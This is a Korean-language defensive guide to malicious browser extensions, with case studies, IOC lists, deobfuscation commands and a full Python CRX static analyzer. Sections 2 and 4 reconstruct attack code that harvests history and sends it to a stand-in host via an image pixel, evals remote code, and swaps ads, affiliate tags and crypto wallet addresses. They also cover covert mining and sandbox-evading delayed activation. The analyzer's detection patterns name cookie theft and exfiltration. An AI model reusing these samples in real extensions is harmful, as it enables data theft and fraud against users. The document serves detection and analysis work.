# 악성 브라우저 확장 분석

## 1. 악성 확장 유형

### 1.1 분류 체계

```
악성 확장 유형
├── 데이터 탈취형
│   ├── 자격증명 탈취 (비밀번호, 쿠키, 토큰)
│   ├── 브라우저 히스토리 수집
│   ├── 스크린샷 캡처
│   └── 폼 데이터 가로채기
├── 광고 인젝션형
│   ├── 페이지 내 광고 삽입
│   ├── 검색 결과 조작
│   └── 리다이렉트 트래픽 가로채기
├── 크립토마이너형
│   ├── CPU 기반 채굴 (Monero 등)
│   └── GPU WebGL 활용 채굴
├── 클릭재킹/사기형
│   ├── 제휴 링크 치환
│   ├── 쇼핑몰 가격 조작
│   └── 암호화폐 주소 치환
└── 스파이웨어형
    ├── 키로거
    ├── 화면 녹화
    └── 마이크/카메라 접근
```

---

## 2. 주요 악성 확장 사례 분석

### 2.1 DataSpii — 대규모 브라우저 데이터 유출 (2019)

**개요:**
- 크롬/파이어폭스 확장 8개가 수백만 사용자의 브라우저 히스토리를 수집
- Namecheap에서 도메인 구입 후 데이터를 외부 서버로 전송
- SimilarWeb 등 유명 서비스도 포함됨

**핵심 공격 기법:**
```javascript
// DataSpii 유형의 히스토리 수집 패턴 (재현 분석 목적)

// 1단계: 설치 초기에는 정상 동작 (탐지 우회)
chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason === 'install') {
    // 설치 후 일정 기간 대기 (샌드박스 분석 우회)
    chrome.storage.local.set({ activationDelay: Date.now() + (7 * 24 * 60 * 60 * 1000) });
  }
});

// 2단계: 활성화 이후 히스토리 수집
chrome.history.search({ text: '', maxResults: 10000 }, (historyItems) => {
  const sensitiveUrls = historyItems.filter(item => {
    // 금융, 의료, 기업 내부 URL 필터링
    return /bank|health|internal|admin|dashboard/.test(item.url);
  });
  // 외부 서버로 전송 (인코딩하여 은닉)
  exfiltrate(sensitiveUrls);
});

// 3단계: 실시간 URL 수집
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    collectAndSend(tab.url, tab.title);
  }
});

function exfiltrate(data) {
  // 이미지 픽셀 요청으로 위장 (네트워크 모니터링 우회)
  const encoded = btoa(JSON.stringify(data));
  new Image().src = `https://analytics-cdn.example.com/pixel.gif?d=${encoded}`;
}
```

**탐지 지표:**
- 분석 CDN처럼 보이는 외부 도메인으로의 지속적 요청
- base64/인코딩된 쿼리 파라미터
- history, tabs 권한을 사용하는 확장

### 2.2 The Great Suspender 변조판 — 공급망 공격 (2021)

**개요:**
- 인기 탭 관리 확장(200만+ 사용자) 인수 후 악성 코드 삽입
- 기존 신뢰받는 확장 ID 활용 → 즉각적인 대규모 배포
- 원격 코드 실행 기능 및 사용자 추적 코드 추가

**변조 패턴:**
```javascript
// 정상 코드 사이에 삽입된 악성 코드 패턴 (분석 목적 재현)

// 정상적인 탭 관리 기능 내에 숨겨진 원격 코드 로더
(async function() {
  try {
    // 설정처럼 보이는 URL에서 실제로는 JS 코드 수신
    const response = await fetch('https://config-server.example.com/settings.json');
    const config = await response.json();
    
    if (config.feature_flags && config.feature_flags.analytics_v2) {
      // 원격에서 받은 코드를 eval로 실행 (V2에서 가능)
      // V3에서는 eval 금지로 차단됨
      const remoteCode = atob(config.feature_flags.analytics_v2);
      eval(remoteCode);  // 위험: 악성 코드 실행
    }
  } catch (e) {
    // 조용히 실패 (탐지 회피)
  }
})();
```

**탐지 지표:**
- 확장 업데이트 후 새로운 권한 추가
- 설정 파일처럼 위장한 외부 JS 로딩
- 갑작스러운 소유자 변경 이력

### 2.3 광고 인젝션 확장 패턴

```javascript
// 광고 인젝션 핵심 기법 분석

// Content Script에서 DOM 조작으로 광고 삽입
(function() {
  // 실제 광고를 악성 광고로 교체
  function replaceAds() {
    document.querySelectorAll('iframe[src*="doubleclick"], iframe[src*="googlesyndication"]').forEach((iframe) => {
      const newIframe = document.createElement('iframe');
      newIframe.src = 'https://malicious-ads.example.com/ad.html';
      newIframe.width = iframe.width;
      newIframe.height = iframe.height;
      newIframe.style.cssText = iframe.style.cssText;
      iframe.parentNode.replaceChild(newIframe, iframe);
    });
  }

  // Amazon/쇼핑 사이트에서 제휴 링크 치환
  function replaceAffiliateLinks() {
    if (location.hostname.includes('amazon')) {
      document.querySelectorAll('a[href*="/dp/"], a[href*="/gp/product/"]').forEach((link) => {
        const url = new URL(link.href);
        url.searchParams.set('tag', 'malicious-affiliate-id');
        link.href = url.toString();
      });
    }
  }

  // 암호화폐 지갑 주소 치환
  function replaceCryptoAddresses() {
    const walletPattern = /\b(0x[a-fA-F0-9]{40}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b/g;
    const attacker_wallet = '0xAttackerWalletAddressHere000000000000000';
    
    function processTextNode(node) {
      if (walletPattern.test(node.textContent)) {
        node.textContent = node.textContent.replace(walletPattern, attacker_wallet);
      }
    }

    const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
    while (walker.nextNode()) {
      processTextNode(walker.currentNode);
    }
  }

  replaceAds();
  replaceAffiliateLinks();
  replaceCryptoAddresses();
})();
```

### 2.4 크립토마이너 확장 패턴

```javascript
// 크립토마이너 확장 분석 (Background Service Worker)

class CryptoMiner {
  constructor() {
    this.isRunning = false;
    this.worker = null;
  }

  // WebWorker를 이용한 채굴 (UI 블로킹 회피)
  start() {
    if (this.isRunning) return;
    
    // Blob URL로 Worker 생성 (파일 없이 동적 생성)
    const workerCode = `
      self.onmessage = function(e) {
        if (e.data.type === 'MINE') {
          const { nonce, target } = e.data;
          let found = null;
          for (let i = nonce; i < nonce + 100000; i++) {
            // 실제 채굴 로직 (단순화)
            const hash = computeHash(i.toString());
            if (hash < target) {
              found = i;
              break;
            }
          }
          self.postMessage({ type: 'RESULT', nonce: found });
        }
      };
      function computeHash(str) { return str; }  // 실제는 SHA-256
    `;
    
    const blob = new Blob([workerCode], { type: 'application/javascript' });
    this.worker = new Worker(URL.createObjectURL(blob));
    this.isRunning = true;
  }

  // CPU 사용률 제한 (탐지 회피)
  throttle(cpuLimit = 0.3) {
    // 30% CPU만 사용하여 사용자가 눈치채지 못하게
    const activePeriod = cpuLimit * 1000;
    const inactivePeriod = (1 - cpuLimit) * 1000;
    
    setInterval(() => {
      if (this.worker) this.worker.postMessage({ type: 'MINE', nonce: Math.floor(Math.random() * 1e9), target: '0000' });
    }, activePeriod + inactivePeriod);
  }
}
```

---

## 3. 악성 확장 탐지 지표 (IOC)

### 3.1 정적 분석 IOC

```
Manifest 수준:
- <all_urls> 또는 https://*/* 호스트 권한
- webRequestBlocking + 모든 URL 조합
- nativeMessaging 권한
- 6개 이상의 고위험 권한 조합
- externally_connectable에 와일드카드 도메인
- 배경 스크립트에 eval, Function() 사용

코드 수준:
- eval(), new Function(), setTimeout(string)
- fetch/XMLHttpRequest to hardcoded external URLs
- document.cookie 직접 접근
- localStorage/sessionStorage 대량 읽기
- chrome.history.search() 호출
- chrome.cookies.getAll() 호출
- MutationObserver로 DOM 전체 감시
- base64 인코딩된 URL 또는 데이터
- 난독화된 변수명 (a0b1c2, _0x1234)
- btoa/atob 과다 사용
```

### 3.2 동적 분석 IOC

```
네트워크:
- 이미지/픽셀 요청으로 위장한 데이터 전송
- 인코딩된 쿼리 파라미터 (base64, hex)
- 비정상적으로 긴 쿠키 또는 헤더
- 분석/CDN 도메인으로의 대량 요청
- 알려지지 않은 C2 서버와의 통신

행위:
- 설치 후 지연 실행 (7일 이상 대기 후 활성화)
- 특정 사이트 방문 후 코드 변경
- 원격 업데이트를 통한 기능 추가
- 시크릿 탭에서만 동작하는 코드
```

---

## 4. Chrome 웹스토어 악성 확장 배포 기법

### 4.1 초기 정상 → 악성 변조 전략

```
단계 1: 유용한 확장 등록 및 사용자 확보
  ↓
단계 2: 리뷰 수 증가, 평점 관리
  ↓
단계 3: 3-6개월 후 자동 업데이트로 악성 코드 삽입
  ↓
단계 4: 인코딩/난독화로 코드 리뷰 우회
  ↓
단계 5: 원격 서버에서 추가 페이로드 로딩 (V2 한정)
```

### 4.2 탐지 우회 기법

```javascript
// 기법 1: 지연 실행 (샌드박스 분석 우회)
chrome.storage.local.get(['firstInstall'], (data) => {
  const now = Date.now();
  if (!data.firstInstall) {
    chrome.storage.local.set({ firstInstall: now });
    return;  // 첫 설치 시에는 실행 안 함
  }
  
  const daysSinceInstall = (now - data.firstInstall) / (1000 * 60 * 60 * 24);
  if (daysSinceInstall > 30) {
    activateMaliciousPayload();  // 30일 후에만 활성화
  }
});

// 기법 2: 특정 사용자 타겟팅 (대량 탐지 회피)
chrome.storage.local.get(['userId'], (data) => {
  if (data.userId && isTargeted(data.userId)) {
    activatePayload();
  }
});

// 기법 3: 지역 기반 활성화
fetch('https://ipapi.co/json/').then(r => r.json()).then(loc => {
  if (['KR', 'JP', 'US'].includes(loc.country_code)) {
    activateRegionalPayload(loc.country_code);
  }
});

// 기법 4: 자바스크립트 난독화 예시
// 원본: chrome.cookies.getAll({}, function(c){ sendToServer(c); })
// 난독화:
var _0xa1b2 = ['getAll', 'cookies', 'sendToServer'];
window['chr' + 'ome'][_0xa1b2[1]][_0xa1b2[0]]({}, function(c){ window[_0xa1b2[2]](c); });
```

---

## 5. 난독화된 확장 코드 분석

### 5.1 수동 역난독화 절차

```bash
# 1. CRX 파일 압축 해제
unzip extension.crx -d extension_dir/

# 2. JavaScript 파일 포매팅
npx prettier --write extension_dir/**/*.js

# 3. 문자열 리터럴 치환 패턴 찾기
grep -r "_0x[0-9a-f]\{4\}" extension_dir/ --include="*.js"

# 4. base64 인코딩 문자열 탐색
grep -r "atob\|btoa" extension_dir/ --include="*.js"

# 5. 동적 함수 실행 탐색
grep -r "eval\|Function(" extension_dir/ --include="*.js"

# 6. 외부 URL 추출
grep -rEo "https?://[^ '\"]+[^ '\".,)]" extension_dir/ --include="*.js" | sort -u
```

### 5.2 자동화 역난독화 도구 활용

```bash
# js-beautify 설치 및 실행
npm install -g js-beautify
js-beautify -r extension_dir/**/*.js

# synchrony (자동 역난독화)
npm install -g @deobfuscate/synchrony
synchrony deobfuscate obfuscated.js -o deobfuscated.js

# webcrack (번들 분석)
npm install -g webcrack
webcrack bundle.js
```

---

## 6. Python CRX 자동 분석 스크립트

### 6.1 CRX 파일 구조

```
CRX3 형식:
[4바이트 매직: Cr24]
[4바이트 버전: 3]
[4바이트 헤더 크기]
[헤더 데이터 (protobuf)]
[ZIP 데이터]
```

### 6.2 완성형 CRX 분석 도구

```python
#!/usr/bin/env python3
"""
CRX 브라우저 확장 자동 분석 도구
사용법: python3 crx_analyzer.py <crx_파일_또는_디렉토리>
"""

import argparse
import base64
import hashlib
import json
import os
import re
import struct
import sys
import zipfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional
import tempfile


# ───────────────────────────── 데이터 클래스 ─────────────────────────────

@dataclass
class PermissionRisk:
    name: str
    level: str  # critical / high / medium / low
    reason: str


@dataclass
class Finding:
    category: str
    severity: str  # critical / high / medium / low / info
    title: str
    detail: str
    file: str = ""
    line: int = 0


@dataclass
class ExtensionReport:
    name: str
    version: str
    manifest_version: int
    extension_id: str = ""
    permissions: list[str] = field(default_factory=list)
    host_permissions: list[str] = field(default_factory=list)
    permission_risks: list[PermissionRisk] = field(default_factory=list)
    external_urls: list[str] = field(default_factory=list)
    findings: list[Finding] = field(default_factory=list)
    files: list[str] = field(default_factory=list)
    overall_risk: str = "low"


# ───────────────────────────── 권한 위험도 DB ─────────────────────────────

PERMISSION_RISK_DB: dict[str, tuple[str, str]] = {
    "<all_urls>":           ("critical", "모든 URL에 대한 완전한 접근"),
    "webRequestBlocking":   ("critical", "HTTP 요청 차단 및 수정 가능"),
    "nativeMessaging":      ("critical", "로컬 시스템 애플리케이션과 통신"),
    "debugger":             ("critical", "Chrome DevTools Protocol 접근"),
    "proxy":                ("critical", "프록시 설정 변경으로 트래픽 가로채기"),
    "management":           ("critical", "다른 확장 설치/제거/활성화"),
    "cookies":              ("high",     "모든 도메인 쿠키 읽기/쓰기"),
    "history":              ("high",     "전체 브라우저 방문 기록 접근"),
    "tabs":                 ("high",     "모든 탭 URL 및 제목 접근"),
    "webRequest":           ("high",     "HTTP 요청 관찰"),
    "downloads":            ("high",     "파일 다운로드 관리"),
    "contentSettings":      ("high",     "사이트별 콘텐츠 설정 변경"),
    "storage":              ("medium",   "확장 로컬 스토리지"),
    "notifications":        ("medium",   "시스템 알림 표시"),
    "bookmarks":            ("medium",   "북마크 읽기/쓰기"),
    "clipboardRead":        ("high",     "클립보드 읽기"),
    "clipboardWrite":       ("medium",   "클립보드 쓰기"),
    "geolocation":          ("high",     "사용자 위치 정보"),
    "activeTab":            ("low",      "현재 탭만 (사용자 제스처 필요)"),
    "scripting":            ("medium",   "스크립트 동적 주입"),
    "declarativeNetRequest":("medium",   "규칙 기반 네트워크 요청 처리"),
}

# 악성 코드 패턴
MALICIOUS_PATTERNS: list[tuple[str, str, str]] = [
    (r"eval\s*\(",                          "high",     "eval() 사용 — 동적 코드 실행"),
    (r"new\s+Function\s*\(",               "high",     "Function() 생성자 — 동적 코드 실행"),
    (r"setTimeout\s*\(\s*[\"']",           "medium",   "문자열로 setTimeout 호출"),
    (r"setInterval\s*\(\s*[\"']",          "medium",   "문자열로 setInterval 호출"),
    (r"document\.write\s*\(",              "medium",   "document.write 사용"),
    (r"innerHTML\s*=\s*[^=]",             "medium",   "innerHTML 직접 할당 — XSS 위험"),
    (r"chrome\.cookies\.getAll",           "high",     "모든 쿠키 수집"),
    (r"chrome\.history\.search",           "high",     "히스토리 검색"),
    (r"atob\s*\(",                          "medium",   "Base64 디코딩 — 난독화 의심"),
    (r"_0x[0-9a-f]{4}",                    "high",     "16진수 난독화 패턴"),
    (r"unescape\s*\(",                     "medium",   "unescape 호출 — 인코딩 우회"),
    (r"String\.fromCharCode",              "medium",   "charCode 문자열 생성 — 난독화"),
    (r"document\.cookie",                  "high",     "document.cookie 직접 접근"),
    (r"localStorage\[|localStorage\.",     "medium",   "localStorage 접근"),
    (r"sessionStorage\[|sessionStorage\.", "medium",   "sessionStorage 접근"),
    (r"navigator\.userAgent",              "low",      "UserAgent 수집"),
    (r"screen\.width|screen\.height",      "low",      "화면 정보 수집"),
    (r"new\s+Image\(\)\.src\s*=",         "high",     "이미지 픽셀 추적 — 데이터 유출 기법"),
    (r"fetch\s*\(\s*['\"]https?://",      "medium",   "외부 URL fetch 요청"),
    (r"XMLHttpRequest",                    "medium",   "XMLHttpRequest 사용"),
    (r"WebSocket\s*\(",                    "medium",   "WebSocket 연결"),
]

# 시크릿 패턴
SECRET_PATTERNS: list[tuple[str, re.Pattern]] = [
    ("API Key",      re.compile(r"['\"]?api[_-]?key['\"]?\s*[:=]\s*['\"][A-Za-z0-9\-_]{20,}['\"]", re.I)),
    ("Secret",       re.compile(r"['\"]?secret['\"]?\s*[:=]\s*['\"][A-Za-z0-9\-_+/]{20,}['\"]", re.I)),
    ("Password",     re.compile(r"['\"]?pass(?:word)?['\"]?\s*[:=]\s*['\"][^'\"]{8,}['\"]", re.I)),
    ("Private Key",  re.compile(r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----")),
    ("AWS Key",      re.compile(r"AKIA[0-9A-Z]{16}")),
    ("Token",        re.compile(r"['\"]?token['\"]?\s*[:=]\s*['\"][A-Za-z0-9\-_.]{20,}['\"]", re.I)),
]

# 외부 URL 패턴
EXTERNAL_URL_PATTERN = re.compile(r"https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&'()*+,;=%]+")
CHROME_EXT_PATTERN = re.compile(r"chrome-extension://|moz-extension://")


# ───────────────────────────── CRX 파서 ─────────────────────────────

class CRXParser:
    CRX3_MAGIC = b"Cr24"
    
    @classmethod
    def extract(cls, crx_path: Path, output_dir: Path) -> bool:
        """CRX 파일을 압축 해제하여 output_dir에 저장"""
        data = crx_path.read_bytes()
        
        if data[:4] == cls.CRX3_MAGIC:
            return cls._extract_crx3(data, output_dir)
        elif data[:2] == b"PK":
            # 이미 ZIP 형식
            with zipfile.ZipFile(crx_path) as zf:
                zf.extractall(output_dir)
            return True
        else:
            print(f"[!] 알 수 없는 CRX 형식: {data[:4]}")
            return False
    
    @classmethod
    def _extract_crx3(cls, data: bytes, output_dir: Path) -> bool:
        """CRX3 형식 처리"""
        try:
            # 헤더 크기 읽기 (바이트 8-12)
            header_size = struct.unpack_from("<I", data, 8)[0]
            zip_start = 12 + header_size
            zip_data = data[zip_start:]
            
            with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
                tmp.write(zip_data)
                tmp_path = tmp.name
            
            with zipfile.ZipFile(tmp_path) as zf:
                zf.extractall(output_dir)
            
            os.unlink(tmp_path)
            return True
        except Exception as e:
            print(f"[!] CRX3 추출 실패: {e}")
            return False


# ───────────────────────────── 분석 엔진 ─────────────────────────────

class ExtensionAnalyzer:
    def __init__(self, extension_dir: Path):
        self.ext_dir = extension_dir
        self.report = ExtensionReport(name="", version="", manifest_version=2)
    
    def analyze(self) -> ExtensionReport:
        manifest_path = self.ext_dir / "manifest.json"
        if not manifest_path.exists():
            raise FileNotFoundError(f"manifest.json 없음: {manifest_path}")
        
        self._parse_manifest(manifest_path)
        self._analyze_js_files()
        self._calculate_overall_risk()
        return self.report
    
    def _parse_manifest(self, manifest_path: Path) -> None:
        """manifest.json 파싱 및 분석"""
        try:
            manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
        except json.JSONDecodeError as e:
            self.report.findings.append(Finding(
                category="manifest",
                severity="high",
                title="manifest.json 파싱 오류",
                detail=str(e),
                file="manifest.json"
            ))
            return
        
        self.report.name = manifest.get("name", "알 수 없음")
        self.report.version = manifest.get("version", "알 수 없음")
        self.report.manifest_version = manifest.get("manifest_version", 2)
        
        # 권한 수집
        perms = manifest.get("permissions", [])
        host_perms = manifest.get("host_permissions", [])
        
        # V2에서는 host permissions이 permissions 안에 포함
        if self.report.manifest_version == 2:
            url_perms = [p for p in perms if p.startswith("http") or p == "<all_urls>"]
            api_perms = [p for p in perms if not (p.startswith("http") or p == "<all_urls>")]
            self.report.permissions = api_perms
            self.report.host_permissions = url_perms
        else:
            self.report.permissions = perms
            self.report.host_permissions = host_perms
        
        self._assess_permissions()
        self._check_manifest_issues(manifest)
    
    def _assess_permissions(self) -> None:
        """권한 위험도 평가"""
        all_perms = self.report.permissions + self.report.host_permissions
        
        for perm in all_perms:
            if perm in PERMISSION_RISK_DB:
                level, reason = PERMISSION_RISK_DB[perm]
                self.report.permission_risks.append(
                    PermissionRisk(name=perm, level=level, reason=reason)
                )
            elif perm.startswith("http") or perm.startswith("<all_urls>"):
                self.report.permission_risks.append(
                    PermissionRisk(
                        name=perm,
                        level="high" if "*" in perm else "medium",
                        reason=f"호스트 권한: {perm}"
                    )
                )
    
    def _check_manifest_issues(self, manifest: dict) -> None:
        """manifest 보안 설정 검사"""
        
        # CSP 검사
        csp = manifest.get("content_security_policy", "")
        if isinstance(csp, dict):
            csp = csp.get("extension_pages", "")
        
        if not csp:
            self.report.findings.append(Finding(
                category="csp",
                severity="medium",
                title="CSP 미설정",
                detail="content_security_policy가 설정되지 않음",
                file="manifest.json"
            ))
        else:
            if "unsafe-eval" in csp:
                self.report.findings.append(Finding(
                    category="csp",
                    severity="high",
                    title="CSP unsafe-eval 허용",
                    detail="eval() 등 동적 코드 실행 허용됨",
                    file="manifest.json"
                ))
            if "unsafe-inline" in csp:
                self.report.findings.append(Finding(
                    category="csp",
                    severity="medium",
                    title="CSP unsafe-inline 허용",
                    detail="인라인 스크립트 실행 허용됨",
                    file="manifest.json"
                ))
        
        # externally_connectable 검사
        ext_conn = manifest.get("externally_connectable", {})
        matches = ext_conn.get("matches", [])
        for m in matches:
            if "*" in m:
                self.report.findings.append(Finding(
                    category="externally_connectable",
                    severity="high",
                    title="externally_connectable 와일드카드",
                    detail=f"임의 출처에서 확장으로 메시지 전송 가능: {m}",
                    file="manifest.json"
                ))
        
        # 위험한 권한 조합 탐지
        critical_perms = [r for r in self.report.permission_risks if r.level == "critical"]
        if len(critical_perms) >= 2:
            self.report.findings.append(Finding(
                category="permissions",
                severity="critical",
                title="복수의 치명적 권한 보유",
                detail=f"치명적 권한 {len(critical_perms)}개: {[p.name for p in critical_perms]}",
                file="manifest.json"
            ))
    
    def _analyze_js_files(self) -> None:
        """JavaScript 파일 정적 분석"""
        js_files = list(self.ext_dir.rglob("*.js"))
        self.report.files = [str(f.relative_to(self.ext_dir)) for f in js_files]
        
        for js_file in js_files:
            rel_path = str(js_file.relative_to(self.ext_dir))
            try:
                content = js_file.read_text(encoding="utf-8", errors="ignore")
            except OSError:
                continue
            
            self._scan_malicious_patterns(content, rel_path)
            self._scan_secrets(content, rel_path)
            self._extract_external_urls(content, rel_path)
    
    def _scan_malicious_patterns(self, content: str, filename: str) -> None:
        """악성 패턴 스캔"""
        lines = content.splitlines()
        
        for pattern_str, severity, description in MALICIOUS_PATTERNS:
            pattern = re.compile(pattern_str)
            for line_num, line in enumerate(lines, 1):
                if pattern.search(line):
                    self.report.findings.append(Finding(
                        category="malicious_pattern",
                        severity=severity,
                        title=description,
                        detail=line.strip()[:100],
                        file=filename,
                        line=line_num
                    ))
                    break  # 파일당 동일 패턴 한 번만 보고
    
    def _scan_secrets(self, content: str, filename: str) -> None:
        """하드코딩된 시크릿 스캔"""
        for secret_type, pattern in SECRET_PATTERNS:
            match = pattern.search(content)
            if match:
                snippet = match.group(0)[:50] + ("..." if len(match.group(0)) > 50 else "")
                self.report.findings.append(Finding(
                    category="hardcoded_secret",
                    severity="critical",
                    title=f"하드코딩된 {secret_type} 탐지",
                    detail=snippet,
                    file=filename
                ))
    
    def _extract_external_urls(self, content: str, filename: str) -> None:
        """외부 URL 추출"""
        urls = EXTERNAL_URL_PATTERN.findall(content)
        for url in urls:
            if not CHROME_EXT_PATTERN.match(url):
                if url not in self.report.external_urls:
                    self.report.external_urls.append(url)
    
    def _calculate_overall_risk(self) -> None:
        """전체 위험도 계산"""
        severity_scores = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
        
        max_score = 0
        for finding in self.report.findings:
            max_score = max(max_score, severity_scores.get(finding.severity, 0))
        
        for risk in self.report.permission_risks:
            max_score = max(max_score, severity_scores.get(risk.level, 0))
        
        score_to_risk = {4: "critical", 3: "high", 2: "medium", 1: "low", 0: "info"}
        self.report.overall_risk = score_to_risk.get(max_score, "low")


# ───────────────────────────── 리포터 ─────────────────────────────

class ReportPrinter:
    COLORS = {
        "critical": "\033[91m",  # 밝은 빨강
        "high":     "\033[31m",  # 빨강
        "medium":   "\033[33m",  # 노랑
        "low":      "\033[32m",  # 초록
        "info":     "\033[36m",  # 청록
        "reset":    "\033[0m",
    }
    
    @classmethod
    def color(cls, text: str, level: str) -> str:
        c = cls.COLORS.get(level, "")
        return f"{c}{text}{cls.COLORS['reset']}"
    
    @classmethod
    def print_report(cls, report: ExtensionReport) -> None:
        print("\n" + "="*60)
        print(f"  확장 분석 리포트: {report.name} v{report.version}")
        print("="*60)
        
        risk_colored = cls.color(report.overall_risk.upper(), report.overall_risk)
        print(f"\n[전체 위험도] {risk_colored}")
        print(f"[Manifest] V{report.manifest_version}")
        print(f"[파일 수] {len(report.files)}개")
        
        # 권한 요약
        print("\n--- 권한 분석 ---")
        for level in ["critical", "high", "medium", "low"]:
            risks = [r for r in report.permission_risks if r.level == level]
            if risks:
                print(f"  {cls.color(level.upper(), level)}:")
                for r in risks:
                    print(f"    • {r.name}: {r.reason}")
        
        # 외부 URL 요약
        if report.external_urls:
            print(f"\n--- 외부 URL ({len(report.external_urls)}개) ---")
            for url in report.external_urls[:10]:
                print(f"  • {url[:80]}")
            if len(report.external_urls) > 10:
                print(f"  ... 외 {len(report.external_urls) - 10}개")
        
        # 취약점 발견사항
        if report.findings:
            print(f"\n--- 보안 발견사항 ({len(report.findings)}건) ---")
            for f in sorted(report.findings, key=lambda x: {"critical":0,"high":1,"medium":2,"low":3,"info":4}.get(x.severity, 5)):
                loc = f" [{f.file}:{f.line}]" if f.line else (f" [{f.file}]" if f.file else "")
                print(f"  [{cls.color(f.severity.upper(), f.severity)}] {f.title}{loc}")
                if f.detail:
                    print(f"    → {f.detail[:80]}")
        else:
            print("\n[+] 악성 패턴 미탐지")
        
        print("\n" + "="*60 + "\n")
    
    @classmethod
    def export_json(cls, report: ExtensionReport, output_path: Path) -> None:
        """JSON 형식으로 리포트 저장"""
        import dataclasses
        data = dataclasses.asdict(report)
        output_path.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
        print(f"[+] JSON 리포트 저장: {output_path}")


# ───────────────────────────── 메인 엔트리 ─────────────────────────────

def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="브라우저 확장(.crx 또는 디렉토리) 자동 보안 분석",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
예시:
  python3 crx_analyzer.py extension.crx
  python3 crx_analyzer.py /path/to/extension_dir
  python3 crx_analyzer.py extension.crx --json report.json
  python3 crx_analyzer.py extensions/ --batch
"""
    )
    parser.add_argument("target", help="분석 대상 (.crx 파일 또는 확장 디렉토리)")
    parser.add_argument("--json", metavar="OUTPUT", help="JSON 리포트 저장 경로")
    parser.add_argument("--batch", action="store_true", help="디렉토리 내 모든 CRX 일괄 분석")
    parser.add_argument("--min-risk", choices=["critical","high","medium","low","info"],
                        default="info", help="이 위험도 이상만 출력 (기본: info)")
    return parser.parse_args()


def analyze_target(target_path: Path, json_output: Optional[Path] = None) -> ExtensionReport:
    """단일 확장 분석"""
    with tempfile.TemporaryDirectory() as tmp_dir:
        work_dir = Path(tmp_dir) / "ext"
        
        if target_path.suffix.lower() == ".crx":
            print(f"[*] CRX 압축 해제: {target_path.name}")
            if not CRXParser.extract(target_path, work_dir):
                raise RuntimeError("CRX 추출 실패")
        elif target_path.is_dir():
            work_dir = target_path
        else:
            raise ValueError(f"지원하지 않는 형식: {target_path}")
        
        analyzer = ExtensionAnalyzer(work_dir)
        report = analyzer.analyze()
        
        ReportPrinter.print_report(report)
        
        if json_output:
            ReportPrinter.export_json(report, json_output)
        
        return report


def main() -> int:
    args = parse_args()
    target = Path(args.target)
    
    if not target.exists():
        print(f"[!] 경로 없음: {target}", file=sys.stderr)
        return 1
    
    try:
        if args.batch and target.is_dir():
            crx_files = list(target.glob("*.crx"))
            if not crx_files:
                print(f"[!] CRX 파일 없음: {target}", file=sys.stderr)
                return 1
            
            print(f"[*] 일괄 분석: {len(crx_files)}개 CRX")
            reports = []
            for crx in crx_files:
                print(f"\n{'─'*40}")
                try:
                    report = analyze_target(crx)
                    reports.append(report)
                except Exception as e:
                    print(f"[!] 분석 실패 {crx.name}: {e}")
            
            # 요약 통계
            risk_counts = {"critical":0,"high":0,"medium":0,"low":0}
            for r in reports:
                risk_counts[r.overall_risk] = risk_counts.get(r.overall_risk, 0) + 1
            
            print("\n=== 일괄 분석 요약 ===")
            for level, count in risk_counts.items():
                if count:
                    print(f"  {ReportPrinter.color(level.upper(), level)}: {count}개")
        else:
            json_path = Path(args.json) if args.json else None
            analyze_target(target, json_path)
    
    except Exception as e:
        print(f"[!] 오류: {e}", file=sys.stderr)
        return 1
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

---

## 7. 확장 IOC 체크리스트

```
□ manifest.json 권한 목록 확인
  □ <all_urls> 또는 모든 HTTPS URL 호스트 권한
  □ webRequestBlocking + cookies 조합
  □ nativeMessaging 권한
  □ management 또는 debugger 권한

□ JavaScript 코드 패턴
  □ eval() 또는 new Function() 호출
  □ atob/btoa 과다 사용
  □ _0x 형태 변수명 (난독화)
  □ 이미지 픽셀 추적 패턴
  □ 외부 서버로 chrome.storage 데이터 전송

□ 네트워크 패턴
  □ 알려지지 않은 분석/광고 CDN 도메인
  □ 인코딩된 쿼리 파라미터
  □ 비정기적 heartbeat 요청

□ 행위 패턴
  □ 설치 후 지연 활성화
  □ 특정 사이트 방문 시에만 동작
  □ 업데이트 후 권한 증가
```

---

## 참고 자료

- DataSpii 분석 보고서: https://github.com/nicowillis/dataspii
- Chrome 악성 확장 사례 모음: https://github.com/nicowillis/chrome-extension-iocs
- CRX 파일 포맷: https://developer.chrome.com/docs/extensions/mv3/crx/
